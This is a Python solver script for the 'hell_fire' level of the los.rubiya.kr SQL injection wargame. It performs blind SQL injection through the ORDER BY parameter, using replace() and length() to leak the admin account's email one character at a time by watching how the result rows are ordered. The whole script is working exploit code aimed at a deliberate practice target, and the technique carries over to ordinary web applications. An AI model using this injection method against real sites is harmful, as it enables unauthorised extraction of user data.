import requests
import binascii

cookie = {'PHPSESSID' : '~~~~'}

def str2hex(string_1):
    return binascii.hexlify(string_1.encode('utf-8')).decode('utf-8')



rubiya_email = "rubiya805@gmail.cm"
for i in range(1,101):
    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?\
            order=length(replace(email,0x%s,\'%s\'))" % (str2hex(rubiya_email), '!'*i)
    res = requests.get(url, cookies=cookie)
    
    if "<tr><td>admin</td><td>**************</td><td>200</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr>" in res.text:
        email_len = i-1
        print("Length of pw : %d" % email_len)
        break

        
        
tmp_admin_email = ""
for i in range(email_len):
    for j in range(32,1000):
        hex_rubiya = str2hex(tmp_admin_email+chr(j))
        url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?\
                order=replace(email,0x%s,0x%s)" % (str2hex(rubiya_email), hex_rubiya)
        res = requests.get(url, cookies=cookie)

        if "<tr><td>admin</td><td>**************</td><td>200</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr>" in res.text:
            tmp_admin_email += chr(j-1)
            print("email(%d) : %s" % (i+1, tmp_admin_email))
            break
            

            
final_admin_email = ""
print("-----------------------------------------------")
print("| admin email | ", end="")
for i in range(email_len):
    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?\
            order=replace(email,0x%s,0x%s)" % (str2hex(rubiya_email), str2hex(final_admin_email + tmp_admin_email[i].upper()))
    res = requests.get(url, cookies=cookie)
    
    if "<tr><td>admin</td><td>**************</td><td>200</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr>" in res.text:
        final_admin_email += tmp_admin_email[i].upper()
    
    else:
        final_admin_email += tmp_admin_email[i].lower()
    
    print("%s" % (final_admin_email[i]), end="")
    
print("\n-----------------------------------------------")